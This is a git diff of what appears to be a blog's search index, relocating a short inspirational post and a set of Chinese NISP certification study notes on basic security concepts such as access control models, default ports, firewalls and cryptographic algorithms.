@@ -863,230 +863,6 @@ over</p>
       </tags>
   </entry>
   <entry>
-    <title>NISP1</title>
-    <url>/2024/05/03/NISP1/</url>
-    <content><![CDATA[<meta name="referrer" content="no-referrer">
-
-
-
-<h3 id="访问控制模型"><a href="#访问控制模型" class="headerlink" title="访问控制模型"></a>访问控制模型</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/image-20240503165404974.png" alt="image-20240503165404974"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E8%87%AA%E4%B8%BB%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E7%AD%96%E7%95%A5.png" alt="自主访问控制"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/Biba%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%A8%A1%E5%9E%8B.png" alt="Biba访问控制模型"></p>
-<blockquote>
-<p>PRAC是基于角色的访问控制模型</p>
-<p>BLP模型、Biba模型、Clark-Wilson模型、Chinese Wall模型是基于强制访问控制模型</p>
-</blockquote>
-<blockquote>
-<p>“针对每个用户指明能够访问的资源”属于自主访问控制。</p>
-</blockquote>
-<blockquote>
-<p>Biba模型解决了系统内数据的完整性问题</p>
-<p>BLP模型解决 了系统内数据的保密性问题</p>
-</blockquote>
-<h3 id="网络设备——集线器、路由器"><a href="#网络设备——集线器、路由器" class="headerlink" title="网络设备——集线器、路由器"></a>网络设备——集线器、路由器</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/nisp2.png" alt="image-20240503170104551"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/nisp1" alt="image-20240503170311884"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%92%8C%E7%BD%91%E5%8D%A1.png" alt="路由器和网卡"></p>
-<blockquote>
-<p>交换机和可以接入交换机的任意两个网络结点提供独享的电信号通路</p>
-</blockquote>
-<h3 id="身份鉴别方式——实体所知、所有、特征"><a href="#身份鉴别方式——实体所知、所有、特征" class="headerlink" title="身份鉴别方式——实体所知、所有、特征"></a>身份鉴别方式——实体所知、所有、特征</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/nisp3" alt="image-20240503170614449"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E8%BA%AB%E4%BB%BD%E9%89%B4%E5%88%AB.png" alt="身份鉴别"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%AF%86%E7%A0%81%E3%80%81%E5%8F%A3%E4%BB%A4%E5%B1%9E%E4%BA%8E%E5%AE%9E%E4%BD%93%E6%89%80%E7%9F%A5.png" alt="密码、口令属于实体所知"></p>
-<blockquote>
-<p>用户名&#x2F;密码、登入账号（实体所知），手机短信验证码（实体所有）、刷脸识别（实体特征）</p>
-</blockquote>
-<h3 id="密码加密算法"><a href="#密码加密算法" class="headerlink" title="密码加密算法"></a>密码加密算法</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/nisp4" alt="哈希算法"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95.png" alt="对称密码算法"></p>
-<blockquote>
-<p>哈希算法：MD5 、SHA-1、SHA-256</p>
-<p>对称加密：RC5、DES、AES</p>
-<p>非对称密码算法：RSA，Rabin，ECC</p>
-</blockquote>
-<h3 id="密码学的发展阶段——香农论文（近代密码学）"><a href="#密码学的发展阶段——香农论文（近代密码学）" class="headerlink" title="密码学的发展阶段——香农论文（近代密码学）"></a>密码学的发展阶段——香农论文（近代密码学）</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E8%BF%9B%E5%85%A5%E8%BF%91%E4%BB%A3%E5%AF%86%E7%A0%81%E9%98%B6%E6%AE%B5%E7%9A%84%E6%A0%87%E5%BF%97.png" alt="进入近代密码阶段的标志"></p>
-<blockquote>
-<p>1949年香农发表的划时代论文””保密系统的通信理论”为近代密码学的标志</p>
-</blockquote>
-<h3 id="密码学的发展阶段——密码机（古典密码学）"><a href="#密码学的发展阶段——密码机（古典密码学）" class="headerlink" title="密码学的发展阶段——密码机（古典密码学）"></a>密码学的发展阶段——密码机（古典密码学）</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/nisp5.png" alt="nisp5"></p>
-<blockquote>
-<p>Enigma密码机属于古典密码学</p>
-</blockquote>
-<h3 id="防火墙的作用"><a href="#防火墙的作用" class="headerlink" title="防火墙的作用"></a>防火墙的作用</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E4%BD%9C%E7%94%A8.png" alt="防火墙的作用"></p>
-<blockquote>
-<p>防火墙保障的是内部网络数据的安全</p>
-<p>防火墙隔离两个不同安全要求的网络</p>
-<p>防火墙根据定义控制策略，检查并控制两个安全域之间的流量</p>
-<p>防火墙对进出网络边界的数据进行保护，防止恶意入侵，恶意代码的传播</p>
-</blockquote>
-<h3 id="入侵检测机制"><a href="#入侵检测机制" class="headerlink" title="入侵检测机制"></a>入侵检测机制</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E4%B8%BB%E6%9C%BA%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F.png" alt="主机入侵检测系统"></p>
-<blockquote>
-<p>主机入侵检测系统能供用于加密网络环境，可移植性差，开发、测试的压力比较大，能够监视所有系统</p>
-</blockquote>
-<h3 id="密码编码学和密码分析学"><a href="#密码编码学和密码分析学" class="headerlink" title="密码编码学和密码分析学"></a>密码编码学和密码分析学</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%AF%86%E7%A0%81%E7%BC%96%E7%A0%81%E5%AD%A6%E5%92%8C%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90%E5%AD%A6.png" alt="密码编码学和密码分析学"></p>
-<blockquote>
-<p>密码编码学：主要研究信息的编码，构建各种安全有效的密码算法和协议，用于信息的加密、认证等方面。</p>
-<p>密码分析学：主要研究破译密码获得消息，或对消息进行伪造。</p>
-</blockquote>
-<h3 id="涉密载体"><a href="#涉密载体" class="headerlink" title="涉密载体"></a>涉密载体</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E6%B6%89%E5%AF%86%E8%BD%BD%E4%BD%93.png" alt="涉密载体"></p>
-<blockquote>
-<p>涉密计算机禁止和外网连接</p>
-</blockquote>
-<h3 id="状态检测机制的缺点"><a href="#状态检测机制的缺点" class="headerlink" title="状态检测机制的缺点"></a>状态检测机制的缺点</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E7%8A%B6%E6%80%81%E6%A3%80%E6%B5%8B%E6%9C%BA%E5%88%B6.png" alt="状态检测机制"></p>
-<blockquote>
-<p>状态检测机制的缺点：检查内容比包过滤检测技术多，对防火墙的性能提出了更高要求；状态检测防火墙的配置非常复杂，对于用户的能力要求较高，使用起来不太方便。</p>
-</blockquote>
-<h3 id="信息安全目标"><a href="#信息安全目标" class="headerlink" title="信息安全目标"></a>信息安全目标</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%AF%86%E7%A0%81%E5%AD%A6%E4%BF%9D%E5%AF%86%E6%80%A7.png" alt="密码学保密性"></p>
-<blockquote>
-<p>保密性事确保信息被合法用户访问，而不呗泄露给非授权的用户、实体或过程，或供其利用的特性。</p>
-</blockquote>
-<h3 id="传输服务的默认端口"><a href="#传输服务的默认端口" class="headerlink" title="传输服务的默认端口"></a>传输服务的默认端口</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ftp%E7%AB%AF%E5%8F%A321.png" alt="ftp端口21"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/POP3%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3.png" alt="POP3默认端口"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/DNS%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A353.png" alt="DNS默认端口53"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/SMTP%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A325.png" alt="SMTP默认端口25"></p>
-<blockquote>
-<p>FTP默认端口21</p>
-<p>SFTP默认端口22(SSH文件传输协议)</p>
-<p>POP3默认端口110</p>
-<p>DNS默认端口53</p>
-<p>SMTP默认端口25</p>
-<p>共享文件夹默认端口445</p>
-<p>远程桌面端口3389</p>
-<p>Telnet端口23</p>
-<p>HTTPS默认端口443</p>
-</blockquote>
-<h3 id="计算机网络的节点——转换节点和访问节点"><a href="#计算机网络的节点——转换节点和访问节点" class="headerlink" title="计算机网络的节点——转换节点和访问节点"></a>计算机网络的节点——转换节点和访问节点</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%9A%84%E8%8A%82%E7%82%B9.png" alt="计算机网络的节点"></p>
-<blockquote>
-<p>计算机网络的节点包括：转换节点和访问节点</p>
-</blockquote>
-<h3 id="物联网体系结构"><a href="#物联网体系结构" class="headerlink" title="物联网体系结构"></a>物联网体系结构</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E7%89%A9%E8%81%94%E7%BD%91%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E4%BD%9C%E7%94%A8.png" alt="物联网体系结构作用"></p>
-<blockquote>
-<p>物联网体系结构的作用：</p>
-<ul>
-<li>感知层：全面感知外界信息，本层主要设备是各种信息收集器</li>
-<li>传输层：主要用于把感知层收集的信息安全可靠地传输到信息支撑层，然后根据不同的应用需求进行信息处理。</li>
-<li>支撑层：对节点采集的信息处理，对信息进行分析和过滤，需要判断接受的信息是否真实有用，过滤掉垃圾升值恶意信息。</li>
-<li>应用层：具体的应用业务，所涉及的安全问题与业务特性相关，例如隐私保护、知识产权保护、取证、数据销毁等方面。</li>
-</ul>
-</blockquote>
-<h3 id="网络信息安全基本属性"><a href="#网络信息安全基本属性" class="headerlink" title="网络信息安全基本属性"></a>网络信息安全基本属性</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E6%95%B0%E6%8D%AE%E5%AE%8C%E6%95%B4%E6%80%A7.png" alt="数据完整性"></p>
-<blockquote>
-<ul>
-<li>完整性：保证信息系统中的数据处于完整的状态，确保信息没有遭受篡改和破坏。</li>
-<li>机密性：网络信息不泄露给非授权用户、实体或程序，能够防止非授权者获取信息。</li>
-<li>可用性：合法许可的用户能后及时获取网络信息或服务的特性。</li>
-<li>抗抵抗性：防止网络信息系统相关用户否认活动行为的特性。</li>
-<li>可控性：网络信息系统责任主体对其具有管理、支配能力的属性。</li>
-</ul>
-</blockquote>
-<h3 id="大数据的生命周期"><a href="#大数据的生命周期" class="headerlink" title="大数据的生命周期"></a>大数据的生命周期</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%A4%A7%E6%95%B0%E6%8D%AE%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F.png" alt="大数据的生命周期"></p>
-<blockquote>
-<p>大数据的生命周期：数据采集、数据存储、数据处理、数据分发、数据删除</p>
-</blockquote>
-<h3 id="七个任务、四项措施"><a href="#七个任务、四项措施" class="headerlink" title="七个任务、四项措施"></a>七个任务、四项措施</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%8A%A0%E5%BC%BA%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%B7%A5%E8%B5%84%E7%9A%84%E6%8C%87%E5%AF%BC%E6%84%8F%E8%A7%81.png" alt="加强工业互联网安全工资的指导意见"></p>
-<blockquote>
-<p>《意见》提出达成七个主要任务和四项保障措施</p>
-</blockquote>
-<h3 id="网络钓鱼攻击手段"><a href="#网络钓鱼攻击手段" class="headerlink" title="网络钓鱼攻击手段"></a>网络钓鱼攻击手段</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB.png" alt="网络钓鱼攻击"></p>
-<blockquote>
-<ul>
-<li>网络钓鱼攻击手段：邮件地址欺骗、伪造网站页面、社会工程学</li>
-<li>主动防御技术：蜜罐技术。</li>
-</ul>
-</blockquote>
-<h3 id="可实现保密性的传输协议——SSL协议"><a href="#可实现保密性的传输协议——SSL协议" class="headerlink" title="可实现保密性的传输协议——SSL协议"></a>可实现保密性的传输协议——SSL协议</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%8D%8F%E8%AE%AE%E7%9A%84%E4%BF%9D%E5%AF%86%E6%80%A7.png" alt="协议的保密性"></p>
-<blockquote>
-<p>SSL协议中，使用握手协商加密和MAC算法以及保密密钥使用握手协议交换的数据进行加密和签名，使用报警协议定义数据传输过程中，出现问题如何去解决。<br>FTP协议、POP3协议、HTTP协议无法保证保密性。、</p>
-</blockquote>
-<h3 id="状态检测防火墙功能"><a href="#状态检测防火墙功能" class="headerlink" title="状态检测防火墙功能"></a>状态检测防火墙功能</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E7%8A%B6%E6%80%81%E6%A3%80%E6%B5%8B%E9%98%B2%E7%81%AB%E5%A2%99.png" alt="状态检测防火墙"></p>
-<blockquote>
-<p>状态检测防火墙又称动态包过滤防火墙，是对传统包过滤的功能拓展。</p>
-<p>状态检测防火墙实质上是包过滤，但它不仅对IP包头信息进行检查过滤，而且还要检查包的TCP头部信息甚至包的内容。</p>
-<p>状态检查防火墙允许规则的动态变化。</p>
-<p>状态防火墙通过采用状态监视器，对网络通信的各层（包括网络层、传输层以及应用层）实施检测，抽取其中部分数据，形成网络连接的动态状态信息。</p>
-</blockquote>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E7%8A%B6%E6%80%81%E6%A3%80%E6%B5%8B%E9%98%B2%E7%81%AB%E5%A2%99%E7%9A%84%E4%BC%98%E7%82%B9.png" alt="状态检测防火墙的优点"></p>
-<h3 id="上网行为管理"><a href="#上网行为管理" class="headerlink" title="上网行为管理"></a>上网行为管理</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86.png" alt="上网行为管理"></p>
-<blockquote>
-<p>上网行为管理目前可实现的功能：上网身份管控、互联网浏览管控、邮件外发管控、用户行为管控、上网应用管控。</p>
-</blockquote>
-<h3 id="IPV6-的地址空间——128位"><a href="#IPV6-的地址空间——128位" class="headerlink" title="IPV6 的地址空间——128位"></a>IPV6 的地址空间——128位</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/IPV6%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4.png" alt="IPV6地址空间"></p>
-<blockquote>
-<p>IPV6是128位的地址空间，IPV4是32位地址空间</p>
-</blockquote>
-<h3 id="IPS-入侵防御系统-主要功能"><a href="#IPS-入侵防御系统-主要功能" class="headerlink" title="IPS(入侵防御系统)主要功能"></a>IPS(入侵防御系统)主要功能</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%85%A5%E4%BE%B5%E9%98%B2%E5%BE%A1%E7%B3%BB%E7%BB%9FIPS.png" alt="入侵防御系统IPS"></p>
-<blockquote>
-<p>IPS(入侵防御系统)主要功能：实时监视和拦截攻击；保护客户端；虚拟补丁。</p>
-</blockquote>
-<h3 id="VLAN之间数据传递的设备——路由器"><a href="#VLAN之间数据传递的设备——路由器" class="headerlink" title="VLAN之间数据传递的设备——路由器"></a>VLAN之间数据传递的设备——路由器</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/VLAN%E6%95%B0%E6%8D%AE%E4%BC%A0%E9%80%92%E8%AE%BE%E5%A4%87.png" alt="VLAN数据传递设备"></p>
-<blockquote>
-<p>能完成不同VLAN之间的数据传递的设备是路由器。路由器适用于不同网络之间。</p>
-</blockquote>
-<h3 id="系统对用户的身份单向鉴别"><a href="#系统对用户的身份单向鉴别" class="headerlink" title="系统对用户的身份单向鉴别"></a>系统对用户的身份单向鉴别</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E4%B8%AA%E4%BA%BA%E7%BD%91%E9%93%B6%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%8D%95%E5%90%91%E9%89%B4%E5%88%AB.png" alt="个人网银系统的单向鉴别"></p>
-<blockquote>
-<p>账号、密码、和验证码成功登陆个人网银系统，系统对用户身份的的单向鉴别。</p>
-</blockquote>
-<h3 id="基于实体所知的鉴别威胁"><a href="#基于实体所知的鉴别威胁" class="headerlink" title="基于实体所知的鉴别威胁"></a>基于实体所知的鉴别威胁</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%9F%BA%E4%BA%8E%E5%AE%9E%E4%BD%93%E6%89%80%E7%9F%A5%E7%9A%84%E9%89%B4%E5%88%AB%E5%A8%81%E8%83%81.png" alt="基于实体所知的鉴别威胁"></p>
-<blockquote>
-<p>基于实体所知的鉴别威胁：暴力破解攻击，窃听攻击，重放攻击</p>
-</blockquote>
-<h3 id="证书管理器的调用"><a href="#证书管理器的调用" class="headerlink" title="证书管理器的调用"></a>证书管理器的调用</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E8%AF%81%E4%B9%A6%E7%AE%A1%E7%90%86%E5%99%A8%E7%9A%84%E8%B0%83%E7%94%A8.png" alt="证书管理器的调用"></p>
-<blockquote>
-<p>cmd打开certmgr.msc</p>
-</blockquote>
-<h3 id="IGMP协议"><a href="#IGMP协议" class="headerlink" title="IGMP协议"></a>IGMP协议</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/IGMP%E5%8D%8F%E8%AE%AE.png" alt="IGMP协议"></p>
-<blockquote>
-<p>IGMP协议：Internet组织管理协议 ，位于TCP&#x2F;IP协议的网络层</p>
-</blockquote>
-<h3 id="TCP网络安全协议"><a href="#TCP网络安全协议" class="headerlink" title="TCP网络安全协议"></a>TCP网络安全协议</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/TCP%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE.png" alt="TCP网络安全协议"></p>
-<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/TCP%E5%8D%8F%E8%AE%AE%E6%89%80%E5%9C%A8%E5%B1%82.png" alt="TCP协议所在层"></p>
-<blockquote>
-<p>IPSec工作再网络层</p>
-<p>PP2P和L2TP工作在数据链路层</p>
-<p>SSL工作在传输层。</p>
-</blockquote>
-<h3 id="应用层协议"><a href="#应用层协议" class="headerlink" title="应用层协议"></a>应用层协议</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%BA%94%E7%94%A8%E5%B1%82%E5%8D%8F%E8%AE%AE.png" alt="应用层协议"></p>
-<blockquote>
-<p>应用层协议：HTTP协议，FTP协议，Telnet</p>
-<p>传输层协议：UDP协议，TCP协议</p>
-</blockquote>
-<h3 id="交换机的物理分层方式"><a href="#交换机的物理分层方式" class="headerlink" title="交换机的物理分层方式"></a>交换机的物理分层方式</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%9A%84%E7%89%A9%E7%90%86%E5%88%86%E5%B1%82%E6%96%B9%E5%BC%8F.png" alt="交换机的物理分层方式"></p>
-<blockquote>
-<p>交换机的物理分层方式：接入层、汇聚层、核心层</p>
-</blockquote>
-<h3 id="网闸-物理隔离系统"><a href="#网闸-物理隔离系统" class="headerlink" title="网闸(物理隔离系统)"></a>网闸(物理隔离系统)</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E7%BD%91%E9%97%B8(%E7%89%A9%E7%90%86%E9%9A%94%E7%A6%BB%E7%B3%BB%E7%BB%9F).png" alt="网闸(物理隔离系统)"></p>
-<blockquote>
-<p>网闸（物理隔离网络）：外部处理单元+内部处理单元+冲裁处理单元</p>
-</blockquote>
-<h3 id="局域网中MAC-介质访问控制子层"><a href="#局域网中MAC-介质访问控制子层" class="headerlink" title="局域网中MAC(介质访问控制子层)"></a>局域网中MAC(介质访问控制子层)</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%B1%80%E5%9F%9F%E7%BD%91%E4%B8%ADMAC(%E4%BB%8B%E8%B4%A8%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E5%AD%90%E5%B1%82).png" alt="局域网中MAC(介质访问控制子层)"></p>
-<blockquote>
-<p>在局域网中，MAC指的是介质访问控制子层</p>
-</blockquote>
-<h3 id="无线局域网"><a href="#无线局域网" class="headerlink" title="无线局域网"></a>无线局域网</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E6%97%A0%E7%BA%BF%E5%B1%80%E5%9F%9F%E7%BD%91.png" alt="无线局域网"></p>
-<h3 id="网卡作用OSI七层的位置"><a href="#网卡作用OSI七层的位置" class="headerlink" title="网卡作用OSI七层的位置"></a>网卡作用OSI七层的位置</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E7%BD%91%E5%8D%A1%E4%BD%9C%E7%94%A8OSI%E4%B8%83%E5%B1%82%E7%9A%84%E4%BD%8D%E7%BD%AE.png" alt="网卡作用OSI七层的位置"></p>
-<h3 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h3><h3 id><a href="#" class="headerlink" title></a><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0.png" alt="哈希函数"></h3><blockquote>
-<p>哈希函数：单向散列函数，它可以将任意有限长度信息映射为固定长度的值</p>
-</blockquote>
-]]></content>
-      <tags>
-        <tag>笔记</tag>
-        <tag>nisp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Open new world</title>
-    <url>/2024/01/13/Open-new-world/</url>
-    <content><![CDATA[<h2 id="OPEN-NEW-WORLD"><a href="#OPEN-NEW-WORLD" class="headerlink" title="OPEN NEW WORLD"></a>OPEN NEW WORLD</h2><p>敬请T期待！</p>
-<p>路漫漫其修远兮，吾将上下而求索！</p>
-<p>​																–《离骚》屈原</p>
-<p>杨宪益先生 译：<br>The way was long, and wrapped in gloom did seem,<br>As I urged on to seek my vanished dream.</p>
-]]></content>
-      <categories>
-        <category>Life</category>
-      </categories>
-      <tags>
-        <tag>Hope_flag</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Linux——基础</title>
     <url>/2024/04/16/Linux%E2%80%94%E2%80%94%E5%9F%BA%E7%A1%80/</url>
     <content><![CDATA[<h1 id="linux系统入门："><a href="#linux系统入门：" class="headerlink" title="linux系统入门："></a>linux系统入门：</h1><h2 id="1-操作系统介绍"><a href="#1-操作系统介绍" class="headerlink" title="1.操作系统介绍"></a>1.操作系统介绍</h2><p>软件：驱动硬件</p>
@@ -1392,6 +1168,230 @@ over</p>
       </tags>
   </entry>
   <entry>
+    <title>Open new world</title>
+    <url>/2024/01/13/Open-new-world/</url>
+    <content><![CDATA[<h2 id="OPEN-NEW-WORLD"><a href="#OPEN-NEW-WORLD" class="headerlink" title="OPEN NEW WORLD"></a>OPEN NEW WORLD</h2><p>敬请T期待！</p>
+<p>路漫漫其修远兮，吾将上下而求索！</p>
+<p>​																–《离骚》屈原</p>
+<p>杨宪益先生 译：<br>The way was long, and wrapped in gloom did seem,<br>As I urged on to seek my vanished dream.</p>
+]]></content>
+      <categories>
+        <category>Life</category>
+      </categories>
+      <tags>
+        <tag>Hope_flag</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>NISP1</title>
+    <url>/2024/05/03/NISP1/</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer">
+
+
+
+<h3 id="访问控制模型"><a href="#访问控制模型" class="headerlink" title="访问控制模型"></a>访问控制模型</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/image-20240503165404974.png" alt="image-20240503165404974"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E8%87%AA%E4%B8%BB%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E7%AD%96%E7%95%A5.png" alt="自主访问控制"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/Biba%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%A8%A1%E5%9E%8B.png" alt="Biba访问控制模型"></p>
+<blockquote>
+<p>PRAC是基于角色的访问控制模型</p>
+<p>BLP模型、Biba模型、Clark-Wilson模型、Chinese Wall模型是基于强制访问控制模型</p>
+</blockquote>
+<blockquote>
+<p>“针对每个用户指明能够访问的资源”属于自主访问控制。</p>
+</blockquote>
+<blockquote>
+<p>Biba模型解决了系统内数据的完整性问题</p>
+<p>BLP模型解决 了系统内数据的保密性问题</p>
+</blockquote>
+<h3 id="网络设备——集线器、路由器"><a href="#网络设备——集线器、路由器" class="headerlink" title="网络设备——集线器、路由器"></a>网络设备——集线器、路由器</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/nisp2.png" alt="image-20240503170104551"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/nisp1" alt="image-20240503170311884"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%92%8C%E7%BD%91%E5%8D%A1.png" alt="路由器和网卡"></p>
+<blockquote>
+<p>交换机和可以接入交换机的任意两个网络结点提供独享的电信号通路</p>
+</blockquote>
+<h3 id="身份鉴别方式——实体所知、所有、特征"><a href="#身份鉴别方式——实体所知、所有、特征" class="headerlink" title="身份鉴别方式——实体所知、所有、特征"></a>身份鉴别方式——实体所知、所有、特征</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/nisp3" alt="image-20240503170614449"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E8%BA%AB%E4%BB%BD%E9%89%B4%E5%88%AB.png" alt="身份鉴别"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%AF%86%E7%A0%81%E3%80%81%E5%8F%A3%E4%BB%A4%E5%B1%9E%E4%BA%8E%E5%AE%9E%E4%BD%93%E6%89%80%E7%9F%A5.png" alt="密码、口令属于实体所知"></p>
+<blockquote>
+<p>用户名&#x2F;密码、登入账号（实体所知），手机短信验证码（实体所有）、刷脸识别（实体特征）</p>
+</blockquote>
+<h3 id="密码加密算法"><a href="#密码加密算法" class="headerlink" title="密码加密算法"></a>密码加密算法</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/nisp4" alt="哈希算法"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95.png" alt="对称密码算法"></p>
+<blockquote>
+<p>哈希算法：MD5 、SHA-1、SHA-256</p>
+<p>对称加密：RC5、DES、AES</p>
+<p>非对称密码算法：RSA，Rabin，ECC</p>
+</blockquote>
+<h3 id="密码学的发展阶段——香农论文（近代密码学）"><a href="#密码学的发展阶段——香农论文（近代密码学）" class="headerlink" title="密码学的发展阶段——香农论文（近代密码学）"></a>密码学的发展阶段——香农论文（近代密码学）</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/%E8%BF%9B%E5%85%A5%E8%BF%91%E4%BB%A3%E5%AF%86%E7%A0%81%E9%98%B6%E6%AE%B5%E7%9A%84%E6%A0%87%E5%BF%97.png" alt="进入近代密码阶段的标志"></p>
+<blockquote>
+<p>1949年香农发表的划时代论文””保密系统的通信理论”为近代密码学的标志</p>
+</blockquote>
